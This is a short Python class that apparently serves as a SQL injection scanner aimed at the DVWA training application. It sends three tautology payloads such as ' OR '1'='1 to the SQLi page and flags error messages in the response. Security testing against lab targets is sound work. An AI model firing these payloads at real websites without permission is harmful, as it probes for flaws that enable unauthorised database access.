import requests

class SQLInjectionTester:

    def __init__(self, base_url):
        # DVWA SQL injection page
        self.url = f"{base_url}/vulnerabilities/sqli/"
        self.test_param = "id"

    def test_sql(self):
        results = []

        payloads = [
            "1 OR 1=1",
            "' OR '1'='1",
            "\" OR \"1\"=\"1"
        ]

        for payload in payloads:
            try:
                r = requests.get(self.url, params={self.test_param: payload})

                # Evidence of SQLi vuln — DVWA will show DB errors
                if (
                    "error" in r.text.lower() or
                    "warning" in r.text.lower() or
                    "sql" in r.text.lower() or
                    "mysql" in r.text.lower()
                ):
                    results.append({
                        "type": "SQL Injection",
                        "url": self.url,
                        "payload": payload,
                        "severity": "High",
                        "evidence": "SQL error or syntax message detected"
                    })

            except Exception:
                continue

        return results
